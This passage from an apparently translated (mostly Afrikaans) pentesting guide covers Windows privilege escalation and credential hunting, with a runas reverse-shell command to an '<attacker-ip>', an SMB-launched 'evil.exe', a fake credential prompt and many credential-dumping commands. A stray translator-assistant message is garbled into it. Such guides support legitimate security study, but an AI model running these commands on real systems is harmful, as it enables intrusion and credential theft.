Kontroleer vir **beperkte dienste** van buite af
```bash
netstat -ano #Opened ports?
```
### Roetetabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die binêre `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry, kan jy na enige poort luister (die eerste keer wat jy `nc.exe` gebruik om na 'n poort te luister, sal dit via die GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy probeer `--default-user root`

Jy kan die `WSL` lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Inlogbewyse-bestuurder / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\\
Die Windows Vault stoor gebruikers-inlogbewyse vir bedieners, webwerwe en ander programme wat **Windows** **die gebruikers outomaties kan aanmeld**. Op die oog af lyk dit asof gebruikers hul Facebook-, Twitter- en Gmail-inlogbewyse ens. kan stoor sodat hulle outomaties in blaaiers aangemeld word. Dit is egter nie so nie.

Die Windows Vault stoor inlogbewyse wat Windows vir die gebruikers outomaties kan gebruik, wat beteken dat enige **Windows-toepassing wat inlogbewyse benodig om toegang tot 'n hulpbron te kry** (bediener of webwerf) **kan gebruik maak van hierdie Credential Manager** & Windows Vault en die voorsiene inlogbewyse kan gebruik in plaas daarvan dat gebruikers telkens die gebruikersnaam en wagwoord moet invoer.

Tensy die toepassings met die Credential Manager interaksie het, dink ek nie dit is moontlik vir hulle om die inlogbewyse vir 'n gegewe hulpbron te gebruik nie. Dus, as jou toepassing die kluis wil gebruik, moet dit op een of ander manier **kommunikeer met die credential manager en die inlogbewyse vir daardie hulpbron opvra** vanaf die standaard bergingskluis.

Gebruik die `cmdkey` om die gestoorde inlogbewyse op die masjien te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die saved credentials te gebruik. Die volgende voorbeeld roep ŉ remote binary via ŉ SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik van `runas` met 'n verskafde stel credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Neem kennis dat mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), of die [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** verskaf 'n metode vir simmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-operatingstelsel vir die simmetriese enkripsie van asymmetriese private sleutels. Hierdie enkripsie maak gebruik van 'n gebruiker- of stelselgeheim wat beduidend tot entropie bydra.

**DPAPI maak die enkripsie van sleutels deur 'n simmetriese sleutel wat afgelei is van die gebruiker se aanmeldgeheime moontlik**. In scenario's wat stelsel-enkripsie betrek, gebruik dit die stelsel se domein-verifikasiegeheime.

Versleutelde gebruikers-RSA-sleutels wat DPAPI gebruik, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) voorstel. **Die DPAPI-sleutel, wat saam met die meester-sleutel wat die gebruiker se private sleutels in dieselfde lêer beskerm, gekoppel is**, bestaan gewoonlik uit 64 bytes ewekansige data. (Dit is belangrik om op te let dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud met die `dir` opdrag in CMD gelys word, alhoewel dit via PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Jy kan **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te ontsleutel.  
Jy kan **baie DPAPI** **masterkeys** uit **geheue** uittrek met die `sekurlsa::dpapi` module (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-credentials

**PowerShell-credentials** word dikwels gebruik vir **skripte** en outomatiseringstake as 'n manier om enkripteerde inloginligting gerieflik te stoor. Die inloginligting word beskerm deur **DPAPI**, wat gewoonlik beteken dat dit slegs deur dieselfde gebruiker op dieselfde rekenaar ontsleutel kan word waarop dit geskep is.

Om 'n PS-credential uit die lêer wat dit bevat te **ontsleutel** kan jy die volgende doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoor RDP-verbindinge

Jy kan hulle vind by `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs uitgevoerde opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Afstandslessenaar Geloofsbriewe-bestuurder**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om **enige .rdg-lêers te ontsleutel**\
Jy kan **baie DPAPI masterkeys** uit die geheue onttrek met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes-app op Windows-werkstasies om **wagwoorde te stoor** en ander inligting, sonder om te besef dat dit 'n databasislêer is. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om na te soek en te ondersoek.

### AppCmd.exe

**Neem kennis dat om wagwoorde uit AppCmd.exe te herstel, jy Administrator moet wees en dit op 'n High Integrity-vlak moet laat loop.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` directory.\
As hierdie lêer bestaan, is dit moontlik dat sekere **credentials** gekonfigureer is en **hersteld** kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installers word **met SYSTEM privileges uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Info van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Inlogbewyse)

### Putty-inlogbewyse
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Gasheer-sleutels
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in die register

SSH private sleutels kan in die registersleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, daarom moet jy nagaan of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, is dit waarskynlik 'n gestoorde SSH key. Dit is versleuteld gestoor, maar kan maklik gedekripteer word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Indien die `ssh-agent` service nie loop nie en jy wil hê dit moet outomaties by opstart begin, voer dan die volgende uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk of hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh keys te skep, dit met `ssh-add` by te voeg en via ssh by 'n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutel-outentisering geïdentifiseer nie.

### Onbewaakte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook na hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM rugsteune
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolkbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### Gekasheerde GPP-wagwoord

Daar was voorheen 'n funksie beskikbaar wat die implementering van pasgemaakte plaaslike administrateurrekeninge op 'n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter beduidende sekuriteitsgebreke gehad. Eerstens kon die Group Policy Objects (GPOs), gestoor as XML-lêers in SYSVOL, deur enige domeingebruiker benader word. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 en 'n publiek gedokumenteerde standaard sleutel versleuteld is, deur enige geauthentiseerde gebruiker gedekripteer word. Dit het 'n ernstige risiko geskep, aangesien dit gebruikers kon toelaat om verhoogde voorregte te verkry.

Om hierdie risiko te versag is 'n funksie ontwikkel wat soek na plaaslik gekasheerde GPP-lêers wat 'n "cpassword"-veld bevat wat nie leeg is nie. Wanneer so 'n lêer gevind word, dekripteer die funksie die wagwoord en gee 'n pasgemaakte PowerShell-objek terug. Hierdie objek bevat besonderhede oor die GPP en die lêer se ligging, wat help met die identifikasie en remediëring van hierdie sekuriteitskwetsbaarheid.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te dekripteer:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die passwords te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN inlogbesonderhede
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials of selfs die credentials van 'n ander gebruiker in te voer** as jy dink hy kan dit weet (let wel dat om die kliënt direk te **vra** vir die **credentials** regtig **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêersname wat credentials bevat**

Bekende lêers wat 'n tyd gelede **passwords** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Ek het nie toegang tot jou lêerstelsel of projekte nie, so ek kan nie die lêer automatisch soek of oopmaak nie. Stuur asseblief die inhoud van src/windows-hardening/windows-local-privilege-escalation/README.md (of 'n lys van die voorgenome lêers), en ek sal dit in Afrikaans vertaal terwyl ek markdown, tags, links en paths presies soos hulle is ongewysig laat.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Inlogbewyse in die RecycleBin

Jy moet ook die Bin nagaan om te kyk vir inlogbewyse daarin

Om **wagwoorde te herkry** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met inlogbewyse**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet na dbs soek waar wagwoorde van **Chrome or Firefox** gestoor word.  
Kontroleer ook die geskiedenis, boekmerkies en gunstelinge van die blaaiers — dalk word daar **wagwoorde** gestoor.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is 'n tegnologie ingebou in die Windows operating system wat interkommunikasie tussen sagtewarekomponente in verskillende tale moontlik maak. Elke COM-komponent word **identified via a class ID (CLSID)** en elke komponent bied funksionaliteit via een of meer interfaces, geïdentifiseer via interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kortom, as jy enige van die **overwrite any of the DLLs** wat uitgevoer gaan word kan oorskryf, kan jy **escalate privileges** indien daardie DLL deur 'n ander gebruiker uitgevoer gaan word.

Om te sien hoe aanvallers COM Hijacking as 'n persistence-meganisme gebruik, kyk:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Algemene wagwoordsoektog in lêers en registry**

Soek na lêerinhoud
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek 'n lêer met 'n sekere lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat na passwords soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin Ek het hierdie plugin geskep om **automaties elke metasploit POST module wat na credentials soek uit te voer** binne die slagoffer.\  
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat passwords bevat wat op hierdie bladsy genoem word.\  
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende tool om password uit 'n stelsel te onttrek.

Die tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **full access**. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met low privileges maar wat al die open handles van die hoofproses erf**.\
Dan, as jy **full access to the low privileged process** het, kan jy die **open handle na die geprivilegieerde proses wat geskep is** met `OpenProcess()` gryp en **inject a shellcode**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid te identifiseer en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander artikel vir 'n meer volledige verduideliking oor hoe om meer open handlers van prosesse en threads te toets en misbruik wat met verskillende vlakke van permissies geërf word (nie net full access nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheue-segmente, bekend as **pipes**, maak proseskommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Named Pipes**, wat toelaat dat ongekoppelde prosesse data deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server-argitektuur, met rolle gedefinieer as **named pipe server** en **named pipe client**.

Wanneer data deur 'n **client** deur 'n pipe gestuur word, het die **server** wat die pipe opgestel het die vermoë om die **identiteit aan te neem** van die **client**, mits dit die nodige **SeImpersonate** regte het. Om 'n **geprivilegieerde proses** te identifiseer wat via 'n pipe kommunikeer wat jy kan naboots, bied die geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pipe wat jy opgestel het interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, vind nuttige gidse [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

Ook laat die volgende tool toe om **'n named pipe-kommunikasie te onderskep met 'n tool soos burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Diverses

### Lêeruitbreidings wat dalk dinge in Windows kan uitvoer

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### **Monitering van opdragreëls vir wagwoorde**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat uitgevoer word wat **credentiales op die opdragreël deurgee**. Die skrip hieronder vang proses-opdragreëls elke twee sekondes op en vergelyk die huidige toestand met die vorige toestand, en gee enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Wagwoorde steel uit prosesse

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang het tot die grafiese koppelvlak (via console of RDP) en UAC is aangeskakel, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" te laat loop vanaf 'n onbevoorregte gebruiker.

Dit maak dit moontlik om privilegies te eskaleer en UAC terselfdertyd met dieselfde kwesbaarheid te omseil. Daarbenewens hoef niks geïnstalleer te word nie en die binêre wat tydens die proses gebruik word, is geteken en uitgereik deur Microsoft.

Sommige van die geraakte stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

